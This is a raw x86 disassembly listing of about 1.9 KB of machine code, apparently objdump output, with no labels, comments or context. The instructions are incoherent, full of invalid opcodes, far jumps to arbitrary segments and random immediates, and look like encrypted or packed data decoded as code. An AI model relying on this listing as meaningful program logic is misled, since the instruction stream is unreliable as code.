  41a46f:	and    al,0xbc
  41a471:	xchg   esp,eax
  41a472:	movsx  ebx,dl
  41a475:	add    cl,dh
  41a477:	cmp    dh,bl
  41a479:	lea    edx,[ebx+0x21]
  41a47c:	xchg   ebx,eax
  41a47d:	mov    edx,0xf47e2663
  41a482:	xchg   ebx,eax
  41a483:	jecxz  0x41a414
  41a485:	xor    eax,0xb5bea76a
  41a48a:	vmread DWORD PTR [ebx],ecx
  41a48d:	add    esi,esp
  41a48f:	mov    bl,dl
  41a491:	int    0x3f
  41a493:	pusha  
  41a494:	cmp    esi,DWORD PTR [ecx]
  41a496:	(bad)  
  41a497:	push   ecx
  41a498:	call   0x6c3aac26
  41a49d:	pop    ss
  41a49e:	jp     0x41a48a
  41a4a0:	push   es
  41a4a1:	jmp    0x41a4cf
  41a4a3:	xor    BYTE PTR [edx-0x4da13489],dh
  41a4a9:	imul   edi,DWORD PTR [edx+0x5bc7d2ff],0x89c454bf
  41a4b3:	jl     0x41a4df
  41a4b5:	lods   al,BYTE PTR ds:[esi]
  41a4b6:	aad    0x9f
  41a4b8:	jb     0x41a446
  41a4ba:	and    ah,bl
  41a4bc:	cmp    dh,BYTE PTR [edi-0x55179d05]
  41a4c2:	add    eax,0x7e773231
  41a4c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4c8:	inc    edx
  41a4c9:	int    0x97
  41a4cb:	adc    eax,0x3f6e5b93
  41a4d0:	push   edx
  41a4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4d2:	xchg   DWORD PTR [ebp+0x364b8f83],esi
  41a4d8:	call   0x6ba2abee
  41a4dd:	lahf   
  41a4de:	push   ebx
  41a4df:	fadd   DWORD PTR es:[ecx]
  41a4e2:	addr16 jno 0x41a544
  41a4e5:	call   0xe8c5:0xa021bcba
  41a4ec:	inc    ebx
  41a4ed:	sbb    cl,BYTE PTR ds:0x2ad5e337
  41a4f3:	mov    ebp,0xeae65b31
  41a4f8:	mov    dl,0xc5
  41a4fa:	mov    dl,0xcd
  41a4fc:	add    DWORD PTR [ebx],ebp
  41a4fe:	xchg   BYTE PTR [edx-0x1cf0f336],bl
  41a504:	or     esi,DWORD PTR [ecx]
  41a506:	mov    WORD PTR [edi-0x2ab86ab2],?
  41a50c:	sub    dh,BYTE PTR [ebx]
  41a50e:	mov    dh,BYTE PTR [edx-0x1afe6295]
  41a514:	addr16 add ecx,esi
  41a517:	daa    
  41a518:	cmp    DWORD PTR [ebx+0x25],esp
  41a51b:	cmc    
  41a51c:	xor    dh,dl
  41a51e:	dec    edx
  41a51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a520:	push   es
  41a521:	mov    esi,DWORD PTR [edx]
  41a523:	or     DWORD PTR [ecx],eax
  41a525:	out    0xa4,eax
  41a527:	jmp    0x5b1f:0xb52ad5cb
  41a52e:	dec    ebx
  41a52f:	dec    esi
  41a530:	arpl   WORD PTR [edi+edi*8+0x1601fbf8],bp
  41a537:	xchg   esp,eax
  41a538:	cld    
  41a539:	(bad)
  41a53c:	inc    edi
  41a53d:	xlat   BYTE PTR ds:[ebx]
  41a53e:	retf   
  41a53f:	outs   dx,BYTE PTR ds:[esi]
  41a540:	mov    dl,0x39
  41a542:	mov    dl,0x49
  41a544:	add    BYTE PTR [edi+0x29d81e53],ah
  41a54a:	addr16 pop ecx
  41a54c:	xchg   DWORD PTR [edx-0x5e99439e],ebx
  41a552:	mov    ebx,0x12f173a0
  41a557:	mov    DWORD PTR [esi],esi
  41a559:	dec    ebp
  41a55a:	push   edx
  41a55b:	sub    dh,BYTE PTR [ecx]
  41a55d:	(bad)  
  41a55e:	in     al,0x19
  41a560:	xor    eax,ecx
  41a562:	inc    edi
  41a563:	ja     0x41a54e
  41a565:	add    al,BYTE PTR [eax+0x1e]
  41a568:	mov    dh,0x9c
  41a56a:	data16 js 0x41a5bc
  41a56d:	add    DWORD PTR [esi+0x67c96d8a],ecx
  41a573:	loopne 0x41a5d8
  41a575:	mov    ch,0xc6
  41a577:	jmp    0xf31:0xd1aab192
  41a57e:	out    0xb6,al
  41a580:	mov    dl,0x91
  41a582:	mov    edx,0x103472da
  41a587:	cmp    ch,dl
  41a589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a58a:	test   eax,0xcbaf41e6
  41a58f:	jmp    edx
  41a591:	or     DWORD PTR [ebp+esi*4-0x2935f5f7],0xc0335b6b
  41a59c:	cmp    DWORD PTR [ebx],eax
  41a59e:	mov    ss:0x1d6775d8,eax
  41a5a4:	retf   
  41a5a5:	call   0xb9ff:0xa11abc26
  41a5ac:	sti    
  41a5ad:	mov    dl,dl
  41a5af:	daa    
  41a5b0:	neg    BYTE PTR [edx+ebp*1]
  41a5b3:	aaa    
  41a5b4:	mov    bl,bl
  41a5b6:	pop    ebx
  41a5b7:	(bad)  
  41a5b8:	cmp    cl,BYTE PTR [edi+ebx*4+0x76379be3]
  41a5bf:	in     al,0x84
  41a5c1:	jns    0x41a632
  41a5c3:	loopne 0x41a595
  41a5c5:	push   ebx
  41a5c6:	xlat   BYTE PTR ds:[ebx]
  41a5c7:	cwde   
  41a5c8:	mov    edx,0x3a3f8393
  41a5cd:	(bad)  
  41a5ce:	push   ecx
  41a5cf:	int3   
  41a5d0:	outs   dx,BYTE PTR ds:[esi]
  41a5d1:	fild   WORD PTR ds:0x4e773a61
  41a5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5d8:	jb     0x41a5a7
  41a5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5db:	pusha  
  41a5dc:	mov    ds:0x463fbe31,eax
  41a5e1:	xchg   esp,eax
  41a5e2:	out    0xd3,al
  41a5e4:	rcl    DWORD PTR [edi+0x3d],0xf6
  41a5e8:	lods   al,BYTE PTR ss:[esi]
  41a5ea:	ja     0x41a5e4
  41a5ec:	popf   
  41a5ed:	fist   DWORD PTR [ebx]
  41a5ef:	repnz pop ecx
  41a5f1:	xchg   ebp,eax
  41a5f2:	cmp    ah,BYTE PTR [ecx+0x8d15f2a]
  41a5f8:	fdiv   DWORD PTR [edi+eiz*2-0x11fd426b]
  41a5ff:	loop   0x41a5c3
  41a601:	mov    WORD PTR [ecx+0x53333a39],?
  41a607:	mov    dl,0xc8
  41a609:	popf   
  41a60a:	sub    ah,ch
  41a60c:	pop    es
  41a60d:	add    ecx,DWORD PTR [edx+0x18d6ba2]
  41a613:	cmc    
  41a614:	add    edx,DWORD PTR [esi-0x76f9712a]
  41a61a:	addr16 or edi,edx
  41a61d:	call   0xb9cb:0xa116bc32
  41a624:	(bad)  
  41a625:	mov    esp,0xa1b23db8
  41a62a:	imul   eax,DWORD PTR [edx],0x1d
  41a62d:	and    DWORD PTR [ebx-0x6c],ebp
  41a630:	repz mov bl,0x7
  41a633:	ret    
  41a634:	outs   dx,DWORD PTR ds:[esi]
  41a635:	ror    DWORD PTR [ebx-0x6473cdee],cl
  41a63b:	pusha  
  41a63c:	xchg   edi,eax
  41a63d:	xor    DWORD PTR [edx-0x16],esi
  41a640:	push   esi
  41a641:	sub    eax,0x36955aa
  41a646:	or     cl,BYTE PTR [esi]
  41a648:	imul   ebx,DWORD PTR [ecx],0x10
  41a64b:	pop    es
  41a64c:	mov    edx,0x46a7d2e1
  41a651:	nop
  41a652:	adc    DWORD PTR [ebx],ebx
  41a654:	xor    cl,al
  41a656:	out    0x4c,al
  41a658:	mov    dh,0x5b
  41a65a:	sub    ch,BYTE PTR [ebx]
  41a65c:	stos   BYTE PTR es:[edi],al
  41a65d:	(bad)
  41a660:	fsubr  st(5),st
  41a662:	jp     0x41a5f9
  41a664:	jg     0x41a680
  41a666:	call   0x6fd3:0x7314aee6
  41a66d:	push   edi
  41a66e:	mov    ch,dl
  41a670:	jae    0x41a637
  41a672:	xor    ebp,ecx
  41a674:	pop    es
  41a675:	sub    ecx,DWORD PTR [edx+0x1b56b9a]
  41a67b:	frstor [edi+0x3b]
  41a67e:	out    0x27,al
  41a680:	ficom  DWORD PTR [edi+0x5b3bd53f]
  41a686:	(bad)  
  41a687:	aas    
  41a688:	jmp    0xec17:0x31f9aafa
  41a68f:	mov    edi,0xd32879ea
  41a694:	fist   DWORD PTR [edi+0x36]
  41a697:	pop    esi
  41a698:	jae    0x41a703
  41a69a:	xor    DWORD PTR [ecx],ebx
  41a69c:	pop    es
  41a69d:	test   DWORD PTR [edx+0x1596b4e],0x12c76729
  41a6a7:	daa    
  41a6a8:	ss xchg edi,eax
  41a6aa:	jmp    0x41a681
  41a6ac:	out    0x5b,eax
  41a6ae:	add    bh,BYTE PTR [edi]
  41a6b0:	inc    esi
  41a6b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6b2:	fwait
  41a6b3:	mov    ch,0x97
  41a6b5:	fimul  DWORD PTR [ebx+0x6b]
  41a6b8:	call   0x6b96adea
  41a6bd:	mov    bl,0x4a
  41a6bf:	and    dl,ch
  41a6c1:	xchg   edi,eax
  41a6c2:	imul   ebx,DWORD PTR ss:[ebx+0x768f0e83],0xb778ab8c
  41a6cd:	add    DWORD PTR [edx-0x76],eax
  41a6d0:	xchg   cl,al
  41a6d2:	(bad)  
  41a6d5:	icebp  
  41a6d6:	pop    ebx
  41a6d7:	fsubrp st(3),st
  41a6d9:	jmp    0x318d9f90
  41a6de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6df:	jmp    0xbb70:0x78aa294a
  41a6e6:	inc    edi
  41a6e7:	mov    ebx,?
  41a6e9:	add    al,0x67
  41a6eb:	mov    WORD PTR [ebx-0x55d67d4b],?
  41a6f1:	xchg   ebp,eax
  41a6f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6f3:	add    bl,BYTE PTR [ebx+0x31]
  41a6f6:	retf   
  41a6f7:	fidivr DWORD PTR [esi+0x3b783fa5]
  41a6fd:	add    esi,edx
  41a6ff:	mov    ch,dl
  41a701:	int    0x2f
  41a703:	pusha  
  41a704:	sub    esi,DWORD PTR [ecx]
  41a706:	(bad)  
  41a707:	dec    edi
  41a708:	jmp    0x41a783
  41a70a:	sub    ebx,esi
  41a70c:	(bad)  [edi]
  41a70e:	ss out 0xa,al
  41a711:	adc    al,0xcf
  41a713:	ror    ebx,cl
  41a715:	inc    ebp
  41a716:	es mov esi,0xbaba5132
  41a71c:	inc    edx
  41a71d:	(bad)  
  41a71f:	cwde   
  41a720:	pop    esp
  41a721:	sub    DWORD PTR [ecx],edx
  41a723:	clc    
  41a724:	pop    edi
  41a725:	ret    
  41a726:	mov    si,0x4d9e
  41a72a:	sub    al,BYTE PTR [ebp+0x69]
  41a72d:	cmp    BYTE PTR [edx-0x1f],dh
  41a730:	push   0xef55a349
  41a735:	add    ah,BYTE PTR [edx-0x59]
  41a738:	data16 or al,0xbb
  41a73b:	jecxz  0x41a6f4
  41a73d:	aaa    
  41a73e:	push   edx
  41a73f:	out    0x76,al
  41a741:	adc    al,0xab
  41a743:	shl    DWORD PTR [edi-0x1541bdc0],cl
  41a749:	imul   ebp,DWORD PTR ds:0xb25757d3,0xb2ed73c2
  41a753:	clc    
  41a754:	inc    edi
  41a755:	xor    DWORD PTR [edx-0x55225916],esp
  41a75b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a75c:	xor    DWORD PTR [ebx-0x1a],eax
  41a75f:	loop   0x41a713
  41a761:	int    0xa9
  41a763:	sub    BYTE PTR ds:0x6bea1303,ch
  41a769:	mov    WORD PTR [ebx-0x2d],fs
  41a76c:	pop    ds
  41a76d:	push   edi
  41a76e:	cli    
  41a76f:	call   0xb07:0xed31a573
  41a776:	mov    bh,BYTE PTR [edx-0x2fe6a95]
  41a77c:	add    edi,DWORD PTR [edx-0x6b013f37]
  41a782:	cmp    edi,eax
  41a784:	fistp  WORD PTR [edx]
  41a786:	inc    ebx
  41a787:	push   esi
  41a788:	call   0x6b42aefe
  41a78d:	call   DWORD PTR [ebx+0x46]
  41a790:	fsub   DWORD PTR [ecx+0x67]
  41a793:	adc    edi,edi
  41a795:	call   0xb9f3:0xa12ebc1a
  41a79c:	out    dx,eax
  41a79d:	mov    ch,BYTE PTR [ebx+0x321c3e2f]
  41a7a3:	xor    DWORD PTR [edx],ebp
  41a7a5:	scas   eax,DWORD PTR es:[edi]
  41a7a6:	rcl    BYTE PTR [esi],1
  41a7a8:	fidiv  WORD PTR [ecx]
  41a7aa:	imul   eax,DWORD PTR [ecx-0x4e],0xffffffbf
  41a7ae:	loopne 0x41a7b6
  41a7b0:	mov    edi,0x10ad0121
  41a7b5:	(bad)  
  41a7b6:	shl    DWORD PTR [esi],cl
  41a7b8:	fmul   DWORD PTR [edi+esi*4+0x4b9fb3b5]
  41a7bf:	es call 0x6bb2aec6
  41a7c5:	outs   dx,DWORD PTR ds:[esi]
  41a7c6:	push   ebx
  41a7c7:	(bad)  
  41a7c8:	fdiv   st,st(1)
  41a7ca:	or     DWORD PTR [bx-0x66],0xa728bdaa
  41a7d2:	pop    edx
  41a7d3:	xchg   ecx,eax
  41a7d4:	addr16 dec edi
  41a7d6:	call   0x6fd5:0x7397ae27
  41a7dd:	pop    ebx
  41a7de:	mov    bh,BYTE PTR [edi]
  41a7e0:	mov    esi,0x1fb563a7
  41a7e5:	sub    ecx,DWORD PTR [ebx-0x66]
  41a7e8:	jmp    0xb9d9b908
  41a7ed:	sbb    dl,BYTE PTR [edx+ecx*4+0x68]
  41a7f1:	leave  
  41a7f2:	sbb    bl,al
  41a7f4:	test   eax,0x78bc449a
  41a7f9:	mov    ds:0x3645d00a,eax
  41a7fe:	retf   
  41a7ff:	fsub   st,st(3)
  41a801:	sar    DWORD PTR [esi],0x9f
  41a804:	out    dx,eax
  41a805:	add    ch,BYTE PTR [eax+0x410c9ca7]
  41a80b:	loopne 0x41a7e0
  41a80d:	sbb    eax,eax
  41a80f:	inc    edx
  41a810:	fisubr WORD PTR [ebp+0x6f]
  41a813:	mov    ds:0x5b4bea02,eax
  41a818:	call   0x2a5dad91
  41a81d:	push   edi
  41a81e:	sub    ecx,DWORD PTR [ebx+0x73]
  41a821:	mov    bl,0xba
  41a823:	enter  0x1a11,0x1b
  41a827:	aaa    
  41a828:	jecxz  0x41a87a
  41a82a:	sub    ah,BYTE PTR [eax]
  41a82c:	xor    esi,ebx
  41a82e:	in     al,0xb0
  41a830:	shl    ecx,cl
  41a832:	cmp    eax,edi
  41a834:	xor    eax,0x4337d05b
  41a839:	lods   al,BYTE PTR ds:[esi]
  41a83a:	xchg   esi,eax
  41a83b:	pusha  
  41a83c:	sub    ah,BYTE PTR [edx+0x2cbe03e0]
  41a842:	xchg   BYTE PTR [ecx-0x2b],bh
  41a845:	sbb    DWORD PTR [ebx+0x33],eax
  41a848:	arpl   WORD PTR [edx+edi*4+0x5301b6f8],dx
  41a84f:	mov    dh,BYTE PTR [edi-0x33]
  41a852:	stos   BYTE PTR es:[edi],al
  41a853:	pusha  
  41a854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a855:	xor    DWORD PTR [ebx-0x16],eax
  41a858:	xchg   esp,edi
  41a85a:	stos   BYTE PTR es:[edi],al
  41a85b:	test   BYTE PTR [eax],dh
  41a85d:	aad    0xf0
  41a85f:	iret   
  41a860:	cmp    BYTE PTR [ebp+ebx*4+0x745b99d5],cl
  41a867:	aas    
  41a868:	dec    eax
  41a869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a86a:	lea    esi,[ebp+0xc4bb589]
  41a870:	call   0x6bacaf90
  41a875:	test   DWORD PTR [ebx+0x3c],edx
  41a878:	fmul   DWORD PTR [ebx]
  41a87a:	addr16 jnp 0x41a822
  41a87d:	call   0xb959:0xa184bc40
  41a884:	push   ebp
  41a885:	xor    BYTE PTR [eax+0x49c1948c],0x97
  41a88c:	stos   BYTE PTR es:[edi],al
  41a88d:	jno    0x41a85f
  41a88f:	lock (bad) 
  41a892:	imul   esp,DWORD PTR [edi-0x1f1fbe4e],0xffffffbe
  41a899:	iret   
  41a89a:	gs js  0x41a8fe
  41a89d:	add    esp,edi
  41a89f:	mov    al,al
  41a8a1:	int    0x15
  41a8a3:	pusha  
  41a8a4:	adc    DWORD PTR [ecx],esi
  41a8a6:	in     al,dx
  41a8a7:	jmp    0xd31:0xd3aaa3d0
  41a8ae:	out    0xb4,al
  41a8b0:	mov    dl,0x93
  41a8b2:	mov    dl,0xe3
  41a8b4:	add    DWORD PTR ds:0xa1fcbc3d,ebx
  41a8ba:	and    DWORD PTR [ebp+0x54ca1add],esi
  41a8c0:	imul   esi,DWORD PTR [ebx+0x1],0x3
  41a8c4:	addr16 std 
  41a8c6:	sub    BYTE PTR [edi],ah
  41a8c8:	sbb    al,0x97
  41a8ca:	rcl    ebp,0xfd
  41a8cd:	pop    ebx
  41a8ce:	sbb    BYTE PTR [edi],bh
  41a8d0:	sub    al,0xa7
  41a8d2:	icebp  
  41a8d3:	mov    ch,0xed
  41a8d5:	(bad)  [ebx+0x68]
  41a8d8:	call   0x6b90b024
  41a8dd:	test   eax,0x37d81853
  41a8e2:	addr16 pop edi
  41a8e4:	mov    DWORD PTR [edx-0x5ea7439c],ebx
  41a8ea:	mov    ebp,0x5482b9b9
  41a8ef:	mov    WORD PTR [eax-0x3f],gs
  41a8f2:	lods   eax,DWORD PTR ds:[esi]
  41a8f3:	jnp    0x41a89f
  41a8f5:	xchg   ebp,eax
  41a8f6:	shr    BYTE PTR [esi+ebx*8],1
  41a8f9:	sti    
  41a8fa:	imul   ecx,DWORD PTR [ebx-0x231f9a4e],0xffffffbe
  41a901:	jmp    0x41a94c
  41a903:	js     0x41a94a
  41a905:	add    DWORD PTR [eax+0x79cda48a],esp
  41a90b:	pusha  
  41a90c:	jne    0x41a93f
  41a90e:	nop
  41a90f:	jmp    0x5131:0xb7aacfb4
  41a916:	out    0x90,al
  41a918:	mov    dl,0xbf
  41a91a:	mov    dl,0xc7
  41a91c:	add    DWORD PTR [ecx],esp
  41a91e:	xchg   BYTE PTR [eax-0x1cfaf330],al
  41a924:	add    DWORD PTR [edi],esi
  41a926:	fsubr  st(6),st
  41a928:	loopne 0x41a93e
  41a92a:	xor    eax,0xcc5731d3
  41a92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a930:	jae    0x41a8b5
  41a932:	xor    ebx,esi
  41a934:	or     BYTE PTR [edi-0x67],ch
  41a937:	aaa    
  41a938:	add    BYTE PTR [ebp+edx*8+0x2c37d1e3],cl
  41a93f:	out    0x10,al
  41a941:	adc    al,0xc5
  41a943:	rol    ecx,cl
  41a945:	push   edi
  41a946:	sbb    al,0x74
  41a948:	jae    0x41a99d
  41a94a:	xor    DWORD PTR [ebx],esp
  41a94c:	pop    es
  41a94d:	fisttp QWORD PTR [edx+0x1436b64]
  41a953:	xor    esp,DWORD PTR [edi-0x53]
  41a956:	js     0x41a97f
  41a958:	dec    esp
  41a959:	xchg   edi,eax
  41a95a:	xchg   ecx,eax
  41a95b:	aad    0x8d
  41a95d:	pop    ebx
  41a95e:	push   0x81a75c3f
  41a963:	mov    ch,0xbd
  41a965:	mov    DWORD PTR [ebx+0x38],ecx
  41a968:	call   0x6bc0b084
  41a96d:	cdq    
  41a96e:	push   ebx
  41a96f:	sub    al,bl
  41a971:	pop    es
  41a972:	addr16 (bad) 
  41a974:	pop    ecx
  41a975:	call   0xb94d:0xa188bcb4
  41a97c:	dec    ecx
  41a97d:	and    BYTE PTR [esp+ecx*4-0x54823e68],0xaa
  41a985:	inc    ebp
  41a986:	sar    ah,1
  41a988:	fmulp  st(3),st
  41a98a:	imul   edi,DWORD PTR [ebx-0x131faa4e],0xffffffbe
  41a991:	mov    ebx,0x1157819
  41a996:	lock mov dl,ah
  41a999:	int    0x9
  41a99b:	pusha  
  41a99c:	add    eax,0xe4eae031
  41a9a1:	lahf   
  41a9a2:	stos   BYTE PTR es:[edi],al
  41a9a3:	out    0x31,eax
  41a9a5:	add    eax,esp
  41a9a7:	cmp    ebp,0x25bd0881
  41a9ad:	or     al,al
  41a9af:	(bad)  
  41a9b1:	jnp    0x41a9ed
  41a9b3:	or     ebp,ebx
  41a9b5:	sbb    dh,BYTE PTR [edi+edi*1]
  41a9b8:	or     BYTE PTR [edi-0xa364a33],ah
  41a9be:	dec    ebx
  41a9bf:	dec    esp
  41a9c0:	call   0x6b6cb120
  41a9c5:	lds    edx,FWORD PTR [ebx+0x7c]
  41a9c8:	fmul   DWORD PTR [ebx+0x67]
  41a9cb:	cmp    esp,ebp
  41a9cd:	call   0xb999:0xa144bc00
  41a9d4:	xchg   ebp,eax
  41a9d5:	xor    BYTE PTR [eax-0x42],0x91
  41a9d9:	add    BYTE PTR [ecx],0x96
  41a9dc:	addr16 jo 0x41a97c
  41a9df:	daa    
  41a9e0:	mov    eax,ds:0x70d57497
  41a9e5:	pop    ebx
  41a9e6:	out    0x37,al
  41a9e8:	je     0x41a9b6
  41a9ea:	test   eax,0xe0952a60
  41a9ef:	sub    al,0x9c
  41a9f1:	mov    esi,0x572ac60a
  41a9f6:	icebp  
  41a9f7:	xor    DWORD PTR [ebx-0x15],0x1a49d8ba
  41a9fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9ff:	mov    esp,0xb97da198
  41aa04:	jns    0x41a988
  41aa06:	xchg   esp,eax
  41aa07:	mov    WORD PTR [eax-0x2547d716],gs
  41aa0d:	sbb    al,cl
  41aa0f:	mov    ebp,0xcf02b7b8
  41aa14:	sub    ch,BYTE PTR [ecx]
  41aa16:	out    0x98,al
  41aa18:	mov    dl,0xb7
  41aa1a:	mov    dl,0xdf
  41aa1c:	add    DWORD PTR [ecx],edi
  41aa1e:	xchg   BYTE PTR [eax-0x1cc2f328],cl
  41aa24:	cmp    DWORD PTR [edi],esi
  41aa26:	aam    0xe6
  41aa28:	call   0x2a14d741
  41aa2d:	push   edi
  41aa2e:	les    ebp,FWORD PTR [ebx+esi*2-0x260a3a85]
  41aa35:	pop    ebx
  41aa36:	xor    al,0x3f
  41aa38:	or     BYTE PTR [edi-0xa364a33],ah
  41aa3e:	dec    ebx
  41aa3f:	dec    esp
  41aa40:	call   0x6b6cb1a0
  41aa45:	lds    edx,FWORD PTR [ebx+0x7c]
  41aa48:	jmp    0x4157:0xa4d3270e
  41aa4f:	ins    BYTE PTR es:[edi],dx
  41aa50:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41aa52:	popf   
  41aa53:	clc    
  41aa54:	cdq    
  41aa55:	call   0xb98d:0xa148bc74
  41aa5c:	mov    DWORD PTR [edx-0x3ea7739c],eax
  41aa62:	mov    ebp,0xd085aa6b
  41aa67:	cmp    al,0xde
  41aa69:	or     ebp,DWORD PTR [ebx+0x7b]
  41aa6c:	mov    dl,0x95
  41aa6e:	loopne 0x41aa9c
  41aa70:	mov    esi,0x557859fb
  41aa75:	add    DWORD PTR [eax+0x49cd948a],esi
  41aa7b:	pusha  
  41aa7c:	inc    ebp
  41aa7d:	xor    DWORD PTR [eax-0x55205b16],esp
  41aa83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa84:	xor    DWORD PTR [ecx-0x1c],eax
  41aa87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa88:	or     esp,ecx
  41aa8a:	and    al,0xf8
  41aa8c:	and    BYTE PTR [ebp+0x3d],bl
  41aa8f:	push   ds
  41aa90:	leave  
  41aa91:	mov    ebx,0x1a01cb0a
  41aa96:	hlt    
  41aa97:	jmp    0x3531:0xdbaaabc8
  41aa9e:	out    0x8c,al
  41aaa0:	mov    dl,0x9b
  41aaa2:	mov    dl,0xeb
  41aaa4:	add    DWORD PTR ds:0xcf4bc86,eax
  41aaaa:	sub    esi,esp
  41aaac:	fild   DWORD PTR [edx-0x7ffb4140]
  41aab2:	add    DWORD PTR [ebx],ecx
  41aab4:	addr16 in eax,0x30
  41aab7:	daa    
  41aab8:	adc    al,0x97
  41aaba:	leave  
  41aabb:	aad    0xc5
  41aabd:	pop    ebx
  41aabe:	and    BYTE PTR [edi],bh
  41aac0:	and    al,0xa7
  41aac2:	stc    
  41aac3:	mov    ch,0xf5
  41aac5:	ror    DWORD PTR [ebx+0x60],0xe8
  41aac9:	dec    edi
  41aaca:	pop    es
  41aacb:	aaa    
  41aacc:	imul   edx,ecx,0x53
  41aacf:	adc    al,bl
  41aad1:	aas    
  41aad2:	addr16 inc edi
  41aad4:	xchg   ecx,eax
  41aad5:	call   0xb985:0xa150bc6c
  41aadc:	add    DWORD PTR [edx-0x3e9f73a4],0x9daa63b5
  41aae6:	shl    BYTE PTR [esi+ebx*8],1
  41aae9:	add    ebp,DWORD PTR [ebx+0x73]
  41aaec:	mov    dl,0x6d
  41aaee:	loopne 0x41aac4
  41aaf0:	mov    esi,0x4d7851f3
  41aaf5:	add    DWORD PTR [eax+0x41cd9c8a],ebp
  41aafb:	pusha  
  41aafc:	jge    0x41ab2f
  41aafe:	cwde   
  41aaff:	jmp    0x5931:0xbfaad7ac
  41ab06:	out    0xe8,al
  41ab08:	mov    dl,0xc7
  41ab0a:	mov    dl,0xcf
  41ab0c:	add    DWORD PTR [ecx],ebp
  41ab0e:	xchg   BYTE PTR [eax-0x1cf2f338],bl
  41ab14:	or     DWORD PTR [edi],esi
  41ab16:	in     al,0xe6
  41ab18:	fcom   DWORD PTR [edi*1-0x2ba8c62d]
  41ab1f:	mov    esp,0xfb318b73
  41ab24:	pop    es
  41ab25:	adc    eax,0x7b72ac8a
  41ab2a:	daa    
  41ab2b:	loopne 0x41ab06
  41ab2d:	xor    DWORD PTR [edx+ebp*8],esi
  41ab30:	or     BYTE PTR [ebx-0x56],ch
  41ab33:	sbb    esi,DWORD PTR [ecx]
  41ab35:	cmc    
  41ab36:	out    0x4c,al
  41ab38:	mov    dl,0x5b
  41ab3a:	mov    dl,0x2b
  41ab3c:	add    ebp,eax
  41ab3e:	xchg   BYTE PTR [esp+esi*1+0xc],bh
  41ab42:	jmp    0x79912a
  41ab47:	out    0x44,al
  41ab49:	adc    al,0x99
  41ab4b:	rcl    DWORD PTR [ebp+0x73007057],cl
  41ab51:	das    
  41ab52:	xor    DWORD PTR [edi+0x7],edx
  41ab55:	mov    cl,0x8a
  41ab57:	xor    BYTE PTR [ebx+0x1f],ch
  41ab5a:	add    DWORD PTR [edi+0x67],esp
  41ab5d:	or     DWORD PTR [edi+eiz*1+0x70],0xa1d5a597
  41ab65:	pop    ebx
  41ab66:	mov    esp,0x55a7803f
  41ab6b:	mov    ch,0x51
  41ab6d:	jge    0x41abba
  41ab6f:	(bad)  
  41ab70:	call   0x6bd4b358
  41ab75:	dec    ebp
  41ab76:	push   ebx
  41ab77:	hlt    
  41ab78:	fcom   st(3)
  41ab7a:	addr16 mov ds:0x9a6d,eax
  41ab7e:	mov    BYTE PTR [esp+edi*4+0x1db961a1],bh
  41ab85:	cmp    al,0x8c
  41ab88:	int3   
  41ab89:	rcl    DWORD PTR [ecx],0xdf
  41ab8c:	stos   BYTE PTR es:[edi],al
  41ab8d:	cmp    eax,edx
  41ab8f:	mov    dh,bl
  41ab91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab92:	imul   ebp,edi,0xffffffb2
  41ab95:	or     eax,esp
  41ab97:	mov    eax,0x782d97be
  41ab9c:	sub    DWORD PTR [ecx],eax
  41ab9e:	les    ecx,FWORD PTR [edx-0xd223e08]
  41aba4:	sub    ebp,ecx
  41aba6:	push   ebx
  41aba7:	pop    eax
  41aba8:	fdiv   DWORD PTR [edi+0x67]
  41abab:	pop    ds
  41abac:	leave  
  41abad:	call   0xb9fd:0xa118bc24
  41abb4:	stc    
  41abb5:	adc    BYTE PTR [esp+ecx*4],0x28
  41abb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abba:	add    dh,al
  41abbc:	addr16 push cs
  41abbe:	(bad)  [edi]
  41abc0:	out    dx,eax
  41abc1:	xchg   edi,eax
  41abc2:	xor    ebp,edx
  41abc4:	adc    eax,0xff3fff5b
  41abc9:	cli    
  41abca:	stos   BYTE PTR es:[edi],al
  41abcb:	or     al,0xe1
  41abcd:	pop    ss
  41abce:	cmp    esp,esi
  41abd0:	unpcklps xmm2,xmm1
  41abd3:	ror    esi,cl
  41abd5:	push   edi
  41abd6:	sub    ecx,DWORD PTR [ebx+0x73]
  41abd9:	xor    DWORD PTR fs:[edi+eax*1],ebp
  41abdd:	retf   0x7b8a
  41abe0:	imul   edx,DWORD PTR [edi+0x1],0x3c
  41abe4:	fiadd  DWORD PTR [bx]
  41abe7:	daa    
  41abe8:	cmp    edx,DWORD PTR [edi+0x5b9ad59e]
  41abee:	ja     0x41ac2f
  41abf0:	dec    ebx
  41abf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf2:	mov    ?,WORD PTR [ebp-0xfb54976]
  41abf8:	add    eax,0xacde5686
  41abfd:	push   esi
  41abfe:	loope  0x41ac68
  41ac00:	pusha  
  41ac01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac02:	push   edi
  41ac03:	cmp    ebp,DWORD PTR [edx]
  41ac05:	adc    edx,esp
  41ac07:	push   edi
  41ac08:	or     eax,0x22f62591
  41ac0d:	nop
  41ac0e:	mov    edi,0x24f0ba9d
  41ac13:	dec    edx
  41ac14:	cmp    BYTE PTR [edi+0x49],dl
  41ac17:	jl     0x41abd7
  41ac19:	jp     0x41abbd
  41ac1b:	stc    
  41ac1c:	daa    
  41ac1d:	popf   
  41ac1e:	xchg   DWORD PTR [esp+eax*2],ebx
  41ac21:	xchg   edx,eax
  41ac22:	inc    esi
